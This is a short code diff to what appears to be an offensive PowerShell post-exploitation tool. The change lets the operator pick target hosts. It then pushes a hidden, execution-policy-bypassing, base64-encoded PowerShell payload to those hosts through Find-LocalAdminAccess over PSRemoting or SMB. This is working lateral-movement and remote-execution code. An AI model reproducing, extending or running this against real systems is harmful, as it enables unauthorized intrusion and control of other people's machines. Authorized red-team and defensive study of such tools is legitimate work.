@@ -534,6 +534,7 @@ exit
 				$UserDefinedTargets = @()
 				$global:AllUserDefinedTargets = $commandParts[1] -split "," | ForEach-Object { $_.Trim() }
 				$UserDefinedTargets = $global:AllUserDefinedTargets
+    				$global:Message = " [+] Targets set. Type 'targets' to list/hide them"
 			}
 			
 			continue
@@ -816,7 +817,13 @@ exit
 					
 					$finalstring =  "powershell.exe -WindowS Hidden -ep Bypass -enc $b64ServerScript"
 					
-					$LocalAdminAccessOutput = Find-LocalAdminAccess -Method PSRemoting -Command $finalstring -NoOutput
+					if(!$global:AllUserDefinedTargets){
+						$LocalAdminAccessOutput = Find-LocalAdminAccess -Method PSRemoting -Command $finalstring -NoOutput
+					}
+					else{
+						$LocalAdminAccessTargets = $global:AllUserDefinedTargets -join ","
+						$LocalAdminAccessOutput = Find-LocalAdminAccess -Targets $LocalAdminAccessTargets -Method PSRemoting -Command $finalstring -NoOutput
+					}
 				}
 				
 				elseif($global:localadminaccesspayload -eq 'SMB'){					
@@ -829,7 +836,13 @@ exit
 					
 					$finalstring = $finalstring -replace '"', "'"
 					
-					$LocalAdminAccessOutput = Find-LocalAdminAccess -Method SMB -Command $finalstring -NoOutput
+					if(!$global:AllUserDefinedTargets){
+						$LocalAdminAccessOutput = Find-LocalAdminAccess -Method SMB -Command $finalstring -NoOutput
+					}
+					else{
+						$LocalAdminAccessTargets = $global:AllUserDefinedTargets -join ","
+						$LocalAdminAccessOutput = Find-LocalAdminAccess -Targets $LocalAdminAccessTargets -Method SMB -Command $finalstring -NoOutput
+					}
 				}
 				
 				$LocalAdminAccessOutput = $LocalAdminAccessOutput.Trim()
